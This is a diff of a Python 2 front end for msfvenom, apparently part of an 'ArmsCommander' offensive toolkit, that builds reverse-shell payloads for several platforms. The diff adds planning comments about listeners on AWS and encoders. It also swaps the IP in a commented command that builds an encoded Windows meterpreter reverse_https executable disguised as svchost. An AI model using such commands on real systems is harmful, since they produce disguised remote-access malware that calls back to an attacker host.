@@ -1,7 +1,3 @@
-#!/usr/bin/env python
-# coding=UTF-8
-
-#The first line allows this script to be executable
 #Startup Module Imports
 import os
 import socket
@@ -13,7 +9,31 @@ sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=64, cols=200)) # sets windo
 
 os.system('cat /root/ArmsCommander/banners/banner_EZPZ.txt')
 print colored('Easy-Peasey, the MSFVenom Payload Generator Targeting All Available Platforms by Chang Tan Lister','red','on_white')
+#General Main Menu Layout
+#Platform
+#Architecture (Preferably 32 bit since x64 is troublesome)
+#Type, Inline or Staged
+#protocol
+#LHOST and LPORT
+#Encoder
+##We should make a cat command to explain to user what LHOST and LPORT means behind a NATed network
+##We should also warn the user to use a remote Amazon AWS server as the listener
+##After payload generation, explain to user what commands to use to setup listener and port forwarding policies
 
+#Disclaimer Notice
+#use cat command on the wall of text
+#A STAGED reverse handler can be used for both STAGED and STAGELESS
+#Sometimes a encoder won't work Be sure to print out a list of encoders
+#Ask user for iterations to encode, warn them that more iterations increases the size
+
+#Define a class for the common msfvenom parameters
+    #LHOST and
+    #LPORT
+    #Encoder
+    #Encoder iterations
+    #Output location
+
+                # payload_Set = opt_Dict[opt_Choice]
 
 class payload_Parameters(object):
     def __init__(self, encoder, encoder_iterations, LHOST, LPORT, output_format, output_payload):
@@ -87,7 +107,7 @@ def test_Encoder_Effectiveness():
     for key in encoder_Dict:
         bad_Bytes = "x00"
         encoder_Set = encoder_Dict[key]
-        cmd_String = 'msfvenom -p {0} -e {1} -i {2} -b "\{3}" -o /root/ArmsCommander/Encoder_Tested'.format(
+        cmd_String = 'msfvenom -p {0} -e {1} -i {2} -b "\{3}" -o /rootArmsCommander/Encoder_Tested'.format(
             payload_to_test,
             encoder_Set,
             iterations,
@@ -134,7 +154,7 @@ def Windows_INLINE():
 
             # generate a handler file
             print 'Creating handler directory and generating handler file'
-            #
+            # 
             # handler_directory = '/root/ArmsCommander/payloads/'
             # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
             # handler_fullpath = handler_directory + handler_filename
@@ -200,7 +220,7 @@ def Windows_STAGED():
             os.system(cmd_String)
             # generate a handler file
             print 'Creating handler directory and generating handler file'
-            #
+            # 
             # handler_directory = '/root/ArmsCommander/payloads/'
             # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
             # handler_fullpath = handler_directory + handler_filename
@@ -231,7 +251,7 @@ def Windows_STAGED():
         #1. Meterpreter Reverse TCP
         #2. Meterpreter Reverse HTTP
         #3. Meterpreter Reverse HTTPS
-# msfvenom -p windows/meterpreter/reverse_https LHOST=52.53.180.45 LPORT=443 PrependMigrate=true PrependMigrateProc=svchost.exe -e x86/alpha_upper -i 5 -b "\x00" -f exe -o svchost_alpha_upper_staged.exe
+# msfvenom -p windows/meterpreter/reverse_https LHOST=54.241.135.223 LPORT=443 PrependMigrate=true PrependMigrateProc=svchost.exe -e x86/alpha_upper -i 5 -b "\x00" -f exe -o svchost_alpha_upper_staged.exe
 def Platform_Windows():
     opt_List = [
         '#0. Return to Main Menu',
@@ -290,7 +310,7 @@ def OSX_PPC():
         os.system(cmd_String)
         # generate a handler file
         print 'Creating handler directory and generating handler file'
-
+        
         # handler_directory = '/root/ArmsCommander/payloads/'
         # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
         # handler_fullpath = handler_directory + handler_filename
@@ -357,7 +377,7 @@ def OSX_x86():
         os.system(cmd_String)
         # generate a handler file
         print 'Creating handler directory and generating handler file'
-
+        
         # handler_directory = '/root/ArmsCommander/payloads/'
         # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
         # handler_fullpath = handler_directory + handler_filename
@@ -446,7 +466,7 @@ def Linux_STAGED():
         os.system(cmd_String)
         # generate a handler file
         print 'Creating handler directory and generating handler file'
-
+        
         # handler_directory = '/root/ArmsCommander/payloads/'
         # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
         # handler_fullpath = handler_directory + handler_filename
@@ -530,7 +550,7 @@ def Python_INLINE():
         os.system(cmd_String)
         # generate a handler file
         print 'Creating handler directory and generating handler file'
-
+        
         # handler_directory = '/root/ArmsCommander/payloads/'
         # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
         # handler_fullpath = handler_directory + handler_filename
@@ -593,7 +613,7 @@ def Python_STAGED():
         os.system(cmd_String)
         # generate a handler file
         print 'Creating handler directory and generating handler file'
-
+        
         # handler_directory = '/root/ArmsCommander/payloads/'
         # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
         # handler_fullpath = handler_directory + handler_filename
@@ -688,7 +708,7 @@ def Ruby_INLINE():
         os.system(cmd_String)
         # generate a handler file
         print 'Creating handler directory and generating handler file'
-
+        
         # handler_directory = '/root/ArmsCommander/payloads/'
         # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
         # handler_fullpath = handler_directory + handler_filename
@@ -763,7 +783,7 @@ def Java_STAGED():
         os.system(cmd_String)
         # generate a handler file
         print 'Creating handler directory and generating handler file'
-
+        
         # handler_directory = '/root/ArmsCommander/payloads/'
         # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
         # handler_fullpath = handler_directory + handler_filename
@@ -835,7 +855,7 @@ def Android_INLINE():
         os.system(cmd_String)
         # generate a handler file
         print 'Creating handler directory and generating handler file'
-
+        
         # handler_directory = '/root/ArmsCommander/payloads/'
         # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
         # handler_fullpath = handler_directory + handler_filename
@@ -900,7 +920,7 @@ def Android_STAGED():
         os.system(cmd_String)
         # generate a handler file
         print 'Creating handler directory and generating handler file'
-
+        
         # handler_directory = '/root/ArmsCommander/payloads/'
         # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
         # handler_fullpath = handler_directory + handler_filename
@@ -1015,7 +1035,7 @@ def main():
     elif opt_Choice == "0":
         os.system('python /root/ArmsCommander/ArmsCommander.py')
         # main()
-    elif opt_Choice == "TEST" or "TEST ENCODERS" or "TESTER":
+    elif opt_Choice == "TEST":
         test_Encoder_Effectiveness()
     else:
         print colored('You have entered a invalid option','red','on_white')
